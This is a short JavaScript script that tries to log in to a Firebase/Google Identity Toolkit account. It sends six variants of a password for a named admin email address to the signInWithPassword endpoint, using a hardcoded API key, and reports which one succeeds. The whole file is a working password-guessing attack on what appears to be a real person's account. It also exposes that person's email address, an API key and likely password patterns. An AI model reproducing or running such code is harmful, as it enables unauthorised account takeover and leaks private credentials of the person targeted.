const apiKey = "AIzaSyBIhgShnll7ms0u_QT6whpgfoEcqobV_3E";
const adminEmail = "attarib352@gmail.com";
const candidates = [
  "bilal145@@",
  "bilal145@@ ",
  "bilal145@",
  "bilal145",
  "Bilal145@@",
  "bilal145@@@"
];

async function testPasswords() {
  for (const pw of candidates) {
    const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${apiKey}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: adminEmail,
        password: pw,
        returnSecureToken: true
      })
    });
    const data = await res.json();
    if (res.ok) {
      console.log(`✅ Success with password: "${pw}"! LocalId: ${data.localId}`);
      return;
    } else {
      console.log(`Failed "${pw}":`, data.error?.message);
    }
  }
}

testPasswords();
